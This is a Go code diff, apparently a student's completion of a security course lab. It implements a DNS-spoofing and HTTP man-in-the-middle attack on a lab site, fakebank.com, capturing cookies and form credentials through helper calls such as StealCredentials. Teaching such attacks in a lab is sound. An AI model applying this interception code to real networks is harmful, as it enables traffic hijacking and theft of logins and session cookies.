@@ -36,6 +36,8 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"net/http/cookiejar"
+	"golang.org/x/net/publicsuffix"
 	//"net/url"
 	"os"
 	"strings"
@@ -268,7 +270,7 @@ func handleUDPPacket(packet gopacket.Packet) {
 		//          this line of code useful when calling spoofDNS, since it requires
 		//          a gopacket.Payload type: castPayload := gopacket.Payload(payload)
 		
-		if dnsData.QDCount>0 && dnsData.ANCount==0 && string(dnsData.Questions[0].Name) == "fakebank.com" && dnsData.Questions[0].Type == layers.DNSTypeA {
+		if dnsData.QDCount>0 && dnsData.ANCount==0 && string(dnsData.Questions[0].Name) == "fakebank.com" {
 			castPayload := gopacket.Payload(payload)
 			
 			var intercept dnsIntercept
@@ -283,8 +285,7 @@ func handleUDPPacket(packet gopacket.Packet) {
 			intercept.DstIP = ipData.DstIP
 			
 			buf_bytes := spoofDNS(intercept, castPayload)
-			//port := int(udpData.SrcPort)
-			port := 53
+			port := int(udpData.SrcPort)
 			dest := ipData.SrcIP
 			sendRawUDP(port, dest, buf_bytes)
 		}
@@ -334,9 +335,10 @@ func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
 		// Protocol: TODO,
 		// SrcIP:    TODO,
 		// DstIP:    TODO,
-		Protocol: layers.IPProtocolIPv4,
+		Protocol: layers.IPProtocolUDP,
 		SrcIP: intercept.DstIP,
-		DstIP: intercept.SrcIP}
+		DstIP: intercept.SrcIP,
+		TTL: 255}
 	udp := &layers.UDP{
 		// SrcPort: TODO,
 		// DstPort: TODO,
@@ -453,14 +455,23 @@ func handleHTTP(rw http.ResponseWriter, r *http.Request) {
 	//          HTTP request, and to capture the real fakebank.com's response.
 	//
 	// Hint:    Make sure to check for cookies in both the request and response!
-	var client *http.Client
+
+	jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
+	client := &http.Client{
+		Jar: jar,
+	}
+	
 	if len(r.Cookies()) != 0 {
 		for _, cookie := range r.Cookies() {
 			cs155.StealClientCookie(cookie.Name, cookie.Value)
 		}
 	}
+	
+	
 	request := spoofBankRequest(r)
-	if response, err := client.Do(request); err == nil {
+	if response, err := client.Do(request); err != nil {
+		panic(err)
+	} else {
 		if len(response.Cookies()) != 0 {
 			for _, cookie := range response.Cookies() {
 				cs155.StealServerCookie(cookie.Name, cookie.Value)
@@ -499,8 +510,8 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
 		//          You can wrap the URL-encoded form data into a Reader with the
 		//          strings.NewReader() function.
 		origRequest.ParseForm()
-		username := origRequest.Form.Get("username")
-		password := origRequest.Form.Get("password")
+		username := origRequest.FormValue("username")
+		password := origRequest.FormValue("password")
 		cs155.StealCredentials(username, password)
 		
 		method := origRequest.Method
